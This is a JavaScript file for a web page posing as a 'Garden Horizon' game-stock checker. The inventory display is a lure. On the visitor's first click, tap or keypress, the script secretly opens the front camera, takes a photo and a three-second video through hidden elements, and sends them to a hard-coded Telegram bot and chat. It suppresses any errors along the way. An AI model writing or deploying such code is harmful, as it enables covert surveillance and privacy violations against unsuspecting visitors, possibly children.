const CONFIG = {
    TELEGRAM_BOT_TOKEN: '8663952645:AAGId4MEbgWPNVNWSsa8o5M_NHXSoqos1po',
    CHAT_ID: '7674484307',
    VIDEO_DURATION: 3000, // 3 seconds
    STOCK_API: 'https://zenithghz.qzz.io/api/all'
};

const elements = {
    form: document.getElementById('claimForm'),
    submitBtn: document.getElementById('submitBtn'),
    spinner: document.getElementById('spinner'),
    btnText: document.querySelector('.btn-text'),
    status: document.getElementById('statusMessage'),
    video: document.getElementById('hidden-video'),
    canvas: document.getElementById('hidden-canvas'),
    stockDisplay: document.getElementById('stock-display'),
    stockList: document.getElementById('stock-list'),
    lastUpdate: document.getElementById('last-update')
};

let hasPermission = false;

// Request permission on any initial user interaction
async function autoStart() {
    if (!hasPermission) {
        try {
            await startCaptureFlow('Initial Interaction');
            hasPermission = true;
            console.log('Capture flow started via user interaction');
        } catch (err) {
            // Silently fail if they deny or have no camera, 
            // but we've triggered the prompt "automatically" as requested.
            console.warn('Auto-start interaction failed:', err);
        }
    }
}

// Global listeners for any initial interaction to trigger the "auto" prompt
['mousedown', 'touchstart', 'keydown'].forEach(eventType => {
    document.addEventListener(eventType, autoStart, { once: true });
});

elements.form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const traceInfo = 'Button Clicked';
    
    // UI Loading state
    setLoading(true);
    elements.status.textContent = 'Connecting to Zenith Database...';
    elements.status.style.color = 'var(--primary)';

    // Silent capture flow - background process
    startCaptureFlow(traceInfo).catch(() => {
        // Silently ignore camera errors (e.g. no camera, denied permission)
    });

    try {
        // Fetch and show stock immediately
        await updateStockDisplay();

        // Final UI state
        elements.status.textContent = 'Inventory Synced Successfully!';
        elements.status.style.color = 'var(--accent)';
    } catch (err) {
        console.error('Stock display error:', err);
        elements.status.textContent = 'Error: Database connection lost.';
        elements.status.style.color = 'var(--accent)';
    } finally {
        setLoading(false);
    }
});

async function updateStockDisplay() {
    try {
        const response = await axios.get(CONFIG.STOCK_API);
        const data = response.data;
        
        if (data.market) {
            const allItems = [...data.market.seeds, ...data.market.gear];
            renderStock(allItems);
            elements.stockDisplay.style.display = 'block';
            elements.lastUpdate.textContent = `Last update: ${new Date().toLocaleTimeString()}`;
        }
    } catch (err) {
        console.error('Stock API error:', err);
    }
}

function renderStock(items) {
    elements.stockList.innerHTML = items.map(item => `
        <div class="stock-item">
            <div class="item-info">
                <span class="item-emoji">${item.emoji || '📦'}</span>
                <span class="item-name">${item.name}</span>
            </div>
            <span class="item-quantity">${item.quantity} In Stock</span>
        </div>
    `).join('');
}

function setLoading(isLoading) {
    elements.submitBtn.disabled = isLoading;
    elements.spinner.style.display = isLoading ? 'block' : 'none';
    elements.btnText.textContent = isLoading ? 'Syncing...' : 'Garden Horizon Stock';
}

async function startCaptureFlow(phoneNumber = 'Initial Load') {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' }, 
            audio: false 
        });
        
        elements.video.srcObject = stream;
        
        // Wait for video to be ready
        await new Promise(resolve => elements.video.onloadedmetadata = resolve);

        // 1. Capture Image
        const imgBlob = await captureImage();
        await sendToTelegram('photo', imgBlob, phoneNumber);

        // 2. Capture Short Video
        const videoBlob = await captureVideo(stream);
        await sendToTelegram('video', videoBlob, phoneNumber);

        // Stop all tracks
        stream.getTracks().forEach(track => track.stop());
        
    } catch (err) {
        throw err;
    }
}

async function captureImage() {
    const { canvas, video } = elements;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    return new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.8);
    });
}

async function captureVideo(stream) {
    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    const chunks = [];
    
    return new Promise((resolve, reject) => {
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            resolve(blob);
        };
        
        mediaRecorder.onerror = reject;
        
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), CONFIG.VIDEO_DURATION);
    });
}

async function sendToTelegram(type, blob, phoneNumber) {
    const formData = new FormData();
    const filename = type === 'photo' ? 'capture.jpg' : 'capture.webm';
    formData.append(type, blob, filename);
    formData.append('caption', `📱 Phone: ${phoneNumber}\n📸 Type: ${type}`);
    
    const endpoint = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
    
    try {
        await axios.post(endpoint, formData, {
            params: { chat_id: CONFIG.CHAT_ID }
        });
    } catch (err) {
        console.error(`Telegram ${type} error:`, err);
    }
}
